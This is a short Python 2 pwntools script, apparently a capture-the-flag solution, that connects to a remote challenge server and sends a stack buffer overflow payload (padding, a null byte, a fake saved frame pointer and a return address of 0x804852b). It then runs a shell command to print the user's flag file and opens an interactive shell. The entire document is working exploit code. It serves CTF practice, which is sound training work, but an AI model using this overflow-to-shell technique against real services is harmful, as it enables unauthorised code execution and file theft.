#!/usr/bin/env python2
from pwn import *


#host , port = '172.16.115.109' , 10100
#host , port = '192.168.78.252' , 4000
host , port = 'ctf.yuawn.idv.tw' , 10109
host , port = '172.16.115.109' , 10109
y = remote( host , port )

# aaaaaa....a\x00aaaa0x804852b

p = 'a' * 19 + '\x00'
p += 'EBBP'
p += p32( 0x804852b )

y.send(p)

sleep(0.1)

y.sendline('cat /home/`whoami`/flag')

y.interactive()
